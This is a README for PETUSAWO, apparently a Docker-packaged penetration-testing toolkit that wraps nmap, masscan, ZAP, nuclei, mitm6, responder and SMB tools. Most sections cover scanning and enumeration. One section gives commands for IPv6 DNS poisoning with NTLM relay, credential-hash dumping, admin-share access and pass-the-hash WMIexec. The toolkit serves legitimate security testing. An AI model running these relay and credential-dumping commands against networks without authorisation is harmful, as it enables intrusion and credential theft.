# PETUSAWO

The purpose of the project is to make it easier to perform penetration testing by wrapping
up various important commands into bash scripts.

**Note: This repository was created with Advanced Users in mind, it is not very beginner friendly**
  
## Supported Open Source Applications

- OWASP Zap
- NMAP
- Crackmapexec
- mitm6
- masscan
- rdp-sec-check.pl
- nuclei

  
## Getting Started

### Dependencies

- Docker

### Building the image

To build the image execute the following command at the root of the repo:

```bash
docker-compose build
```

### Executing the docker image

### Before getting started

Throughout this repository, we refer to "list_of_ips". To pass a list of IPs to any command,
create a text file in the directory from which the docker command will be run. Ensure that
you list one IP per line in the text-file, for example.

```
198.1.2.220
198.1.3.221
```

Then you can pass the file name as command line argument to the tool.
### Logging

Output from the docker container will either be written to log files your current working directory, or
sent to stdout and displayed in your CLI

### Attempt to enumerate Domain Controller anonymously
**Output File Name: dc_anonymous_enumeration_results**

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
extract_info_dc 192.168.1.159 
```

Example of attempting to extract information from a list of Domain Controllers:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
 enumerate_dc target_list
```
### SSH-AUDIT
**Output File Name: ssh_audit_results**

Example of running ssh-audit against an IP address:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
ssh_audit 192.168.1.250 
```

Example of running ssh-audit against a list of IP addresses:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
ssh_audit target_list
```

### Nuclei
**Output File Name: nuclei_results**

Example of running nuclei against a single url using the http templates:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nuclei https://xxxx.xx.om -t http/
```

Example of running nuclei against a list of urls using the http templates:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nuclei target_list -t http/
```
### Masscan
**Output File Name: masscan_raw_results**

Example of running masscan against an IP address and a single port:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
masscan 192.168.1.250 \-p80
```

Example of running masscan against a list of IP addresses and all ports:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
masscan target_list \-p0\-65535
```
### ZAP
**Output File Name: zap_processed_results_.json**

To run zap against a url, run the following command, replacing the url with the target url.
The results will be outputted to whatever directory you specify.

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
zap_vuln_scan https://yourtarget.com/
```

To run Zap against a list of URLs, place the urls in file named urls.txt in the `PWD` with each url
on a new line (the last line must be terminated with a new line). Run:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
zap_vuln_scan your_list.txt
```

### NMAP

**Output File Name: nmap_raw_results**

Example of running NMAP's vulnerability scan against an IP address:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nmap_vuln_scan 000.00.000.000
```

To run NMAP's vulnerability scan against a list of ip addresses, place
the list in a file named ips.txt in the `PWD` with each IP address on a new line
(the last line must be terminated with a new line).
Run:

```bash
docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nmap_vuln_scan your_list.txt
```

### General WEB Application Scans

**Output File Names: Multiple files with `.log` extensions**

All web application scans can be run through an optional proxy server such as burpsuite.
If no proxy is being used, the option can be ignored.

```bash
docker run --rm --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
run_web_app_tests target_ip_address_or_list_of_ips optional_proxy_address
```

### Check for IPV6 traffic

**Output: CLI**

```bash
screen -S tshark -d -m docker run -it --rm --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_for_ipv6_traffic network_interface to listen on
```

You can view/interact with the above screen with the command:
```
screen -r tshark
```
### Checking if SMB signing is not required

**Output: CLI**

```bash
docker run --rm --network host -it -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest check_if_smb_signing_is_required smb_targets.txt
```

### Exploit SMB signing not required via DNS6 poisoning and NTLM relay.

**Output: CLI**

If Ipv6 is not being actively managed by a DNS and DHCP server and IPv6 packets are flowing then we can likely
compromise this network by setting up a DNS server and DHCP server for IPv6. It is worth noting that according to [RFC3484](https://www.ietf.org/rfc/rfc3484.txt)

IPv6 will be preferred over IPv4 which means that once IPv6 is being managed, nodes on the network will send packets via IPv6 as
opposed to IPV4.

By default, windows hosts will send a DHCP discovery packet to try to discover DHCP servers and we will take advantage of this by responding using 
mitm6

```bash
screen -S mitm6 -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_mitm6 local_network_interface target_domain_name
```

You can view/interact with the above screen with the command:
```
screen -r mitm6
```

```bash
screen -S ipv6_relay -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_nltm_relay_ipv6 target_ip_address_or_list_of_ips
```

You can view/interact with the above screen with the command:

```
screen -r ipv6_relay
```

You can check if SMB sessions have been created successfully by resuming the `relay_ipv6`
screen and running the `socks` command

If SMB sessions have been created, you can perform a number of actions going forward using proxychains:


- Dumping hashes

The domain/account used in the command below can be retrieved by resuming the `relay_ipv6` screen (see above) and
running the `socks` command

**Output: CLI**

    ```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest dump_creds DOMAIN/Account@x.x.x.x
    ```

- List SMB shares

**Output: CLI**

```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest list_smb_shares ip_address_of_target DOMAIN\\Account
```

- Accessing SMB shares

**Output: CLI**

```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest access_smb \\\\ip_address_of_target\\c$ DOMAIN\\Account
```
- Passing hashes for a WMIexec session

**Output: CLI**

NOTE: username must be in lowercase

```bash

docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest pass_hashes_wmi_exec hashes username@x.x.x.x
```


### Exploit SMB signing not required via DNS poisoning and NTLM relay.

**Output: CLI**

```bash

screen -S responder -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_responder local_network_interface
```

You can interact with the above screen with the command:
```
screen -r responder
```

```bash
screen -S ipv4_relay -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_nltm_relay_ipv4 target_ip_address_or_list_of_ips
```

You can interact with the above screen with the command:

```
screen -r ipv4_relay
```

### Checking for and exploit null SMB Sessions

**Output File Name: smb_null_session_results**

```bash
docker run --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_and_exploit_null_smb_sessions target_ip_address_or_list_of_ips
```

### List ISCSI targets

**Output: CLI**

```bash
docker run --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
list_iscsi_targets target_ip_address_or_list_of_target_ips
```

### Connect to ISCSI targets without authentication

**Output: CLI**

```bash
docker run --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
test_unauthenticated_iscsi_sessions target_ip_address_or_list_of_target_ips iscsi_target
```

### Discover aws services

**Output File Name: aws_resources.json**

Change the region as needed, AWS credentials must already be exported into your ENV
```bash
docker run --network host --env-file <(env | grep -E '^AWS_') -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest discover_aws_services us-east-1
```
### Enumerate ciphers a host is using

**Output File Name: supported_ciphers**
```bash
docker run --network host --env-file <(env | grep -E '^AWS_') -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest enumerate_supported_ciphers PORT IPADDRESS_OR_URL
```

### Perform security checks on rdp

**Output File Name: targetipaddress-rdp-check-results**
```bash
docker run --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest check_rdp
```
### Utilities

Resolve IPs to FQDNS

### Extract only hosts that are up:

```bash
sudo docker run --init --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest nmap -sn 192.168.1.0/24 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
```
**Output File Name: dns_resolution.log**

```bash
docker run --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
resolve_fqdn target_ip_address_or_list_of_target_ips 
```

Assume role with MFA

```bash
. ./assume_role_with_mfa arn:aws:iam::XXXXXXX:role/assume_role_test session_name arn:aws:iam::xxxxxxx:mfa/xxxx 0000(your_mfa_code)
```

Assume role without MFA

```bash
. ./assume_role_with_mfa arn:aws:iam::XXXXXXX:role/assume_role_test session_name
```

Get Session Token and Assume Role

```bash
. ./get_session_token arn:aws:iam::XXXXXX:mfa/xxxx 0000(your_mfa_code)
```
### Output Files

All log files will be placed in the directory from which you run the docker container.
